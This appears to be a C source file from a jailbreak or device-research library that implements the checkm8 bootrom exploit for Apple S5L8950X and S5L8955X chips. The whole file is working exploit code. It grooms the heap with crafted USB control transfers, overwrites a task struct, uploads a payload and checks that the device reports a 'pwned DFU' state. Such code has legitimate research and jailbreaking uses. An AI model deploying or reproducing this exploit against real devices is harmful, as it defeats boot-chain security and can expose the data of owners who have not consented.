#include <libbelladonna.h>
#include <payload_gen.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#define S5l8950X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
#define S5l8955X_OVERWRITE S5l8950X_OVERWRITE

static int usb_req_stall(irecv_client_t dev){
	return irecv_usb_control_transfer(dev, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
}

static int usb_req_leak(irecv_client_t dev){
	unsigned char buf[0x40];
	return irecv_usb_control_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
}

static int usb_req_no_leak(irecv_client_t dev){
	unsigned char buf[0x41];
	return irecv_usb_control_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
}

int checkm8_supported(irecv_client_t dev) {
	const struct irecv_device_info* info = irecv_get_device_info(dev);
	switch(info->cpid) {
		case 0x8950:
			return 0;
		case 0x8955:
			return 0;
		default:
			return -1;
	}
	return 0;
}

static int get_exploit_configuration(uint16_t cpid, checkm8_config_t* config) {
	switch(cpid) {
		case 0x8950:
			config->large_leak = 659;
			config->hole = 0;
			config->overwrite_offset = 0x640;
			config->leak = 0;
			config->overwrite = S5l8950X_OVERWRITE;
			config->overwrite_len = 28;
			return 0;
		case 0x8955:
			config->large_leak = 659;
			config->hole = 0;
			config->overwrite_offset = 0x640;
			config->leak = 0;
			config->overwrite = S5l8955X_OVERWRITE;
			config->overwrite_len = 28;
			return 0;
		default:
			BELLADONNA_ERROR("No exploit configuration is available for your device.");
			return -1;
	}
}

int checkm8_exploit(irecv_client_t dev) {
	unsigned char buf[0x800] = { 'A' };
	int ret;
	checkm8_config_t config;
	memset(&config, '\0', sizeof(checkm8_config_t));

	const struct irecv_device_info* info = irecv_get_device_info(dev);
	irecv_device_t device_info = NULL;
	irecv_devices_get_device_by_client(dev, &device_info);

	belladonna_log("checkm8 by axi0mX\n");

	ret = get_exploit_configuration(info->cpid, &config);
	if(ret != 0) {
		BELLADONNA_ERROR("Failed to get exploit configuration.");
		irecv_close(dev);
		return -1;
	}

	ret = get_payload_configuration(info->cpid, device_info->product_type, &config);
	if(ret != 0) {
		BELLADONNA_ERROR("Failed to get payload configuration.");
		irecv_close(dev);
		return -1;
	}

	belladonna_log("Grooming heap\n");
	ret = usb_req_stall(dev);
	if(ret != IRECV_E_PIPE) {
		BELLADONNA_ERROR("Failed to stall pipe.");
		return -1;
	}
	usleep(100);
	for(int i = 0; i < config.large_leak; i++) {
		ret = usb_req_leak(dev);
		if(ret != IRECV_E_TIMEOUT) {
			BELLADONNA_ERROR("Failed to create heap hole.");
			return -1;
		}
	}
	ret = usb_req_no_leak(dev);
	if(ret != IRECV_E_TIMEOUT) {
		BELLADONNA_ERROR("Failed to create heap hole.");
		return -1;
	}
	irecv_reset(dev);
	irecv_close(dev);
	dev = NULL;
	usleep(100);
	irecv_open_with_ecid_and_attempts(&dev, 0, 5);
	if(!dev) {
		BELLADONNA_ERROR("Failed to reconnect to device.");
		return -1;
	}


	belladonna_log("Preparing for overwrite\n");

	int sent = irecv_async_usb_control_transfer_with_cancel(dev, 0x21, 1, 0, 0, buf, 0x800, 15);
	if(sent < 0) {
		BELLADONNA_ERROR("Failed to send bug setup.");
		irecv_close(dev);
		return -1;
	}
	if(sent > config.overwrite_offset) {
		BELLADONNA_ERROR("Failed to abort bug setup.");
		irecv_close(dev);
		return -1;
	}
	ret = irecv_usb_control_transfer(dev, 0, 0, 0, 0, buf, config.overwrite_offset - sent, 10);
	if(ret != IRECV_E_PIPE) {
		BELLADONNA_ERROR("Failed to push forward overwrite offset.");
		return -1;
	}
	ret = irecv_usb_control_transfer(dev, 0x21, 4, 0, 0, NULL, 0, 0);
	if(ret != 0) {
		BELLADONNA_ERROR("Failed to send abort.");
		return -1;
	}
	irecv_close(dev);
	dev = NULL;
	usleep(500000);
	irecv_open_with_ecid_and_attempts(&dev, 0, 5);
	if(!dev) {
		BELLADONNA_ERROR("Failed to reconnect to device.");
		return -1;
	}

	belladonna_log("Grooming heap\n");
	ret = usb_req_stall(dev);
	if(ret != IRECV_E_PIPE) {
		BELLADONNA_ERROR("Failed to stall pipe.");
		return -1;
	}
	usleep(100);
	ret = usb_req_leak(dev);
	if(ret != IRECV_E_TIMEOUT) {
		BELLADONNA_ERROR("Failed to create heap hole.");
		return -1;
	}
	belladonna_log("Overwriting task struct\n");

	ret = irecv_usb_control_transfer(dev, 0, 0, 0, 0, config.overwrite, config.overwrite_len, 100);
	if(ret != IRECV_E_PIPE) {
		BELLADONNA_ERROR("Failed to overwrite task.");
		return -1;
	}

	belladonna_log("Uploading payload\n");
	ret = irecv_usb_control_transfer(dev, 0x21, 1, 0, 0, config.payload, config.payload_len, 100);
	if(ret != IRECV_E_TIMEOUT) {
		BELLADONNA_ERROR("Failed to upload payload.");
		return -1;
	}

	belladonna_log("Executing payload\n");
	irecv_reset(dev);
	irecv_close(dev);
	free(config.payload);
	dev = NULL;
	usleep(100);
	irecv_open_with_ecid_and_attempts(&dev, 0, 5);
	if(!dev) {
		BELLADONNA_ERROR("Failed to reconnect to device.");
		return -1;
	}
	info = irecv_get_device_info(dev);
	char* pwnd_str = strstr(info->serial_string, "PWND:[");
	if(!pwnd_str) {
		irecv_close(dev);
		BELLADONNA_ERROR("Device not in pwned DFU mode.");
		return -1;
	}
	belladonna_log("Device is now in pwned DFU mode\n");
	irecv_close(dev);
	return 0;
}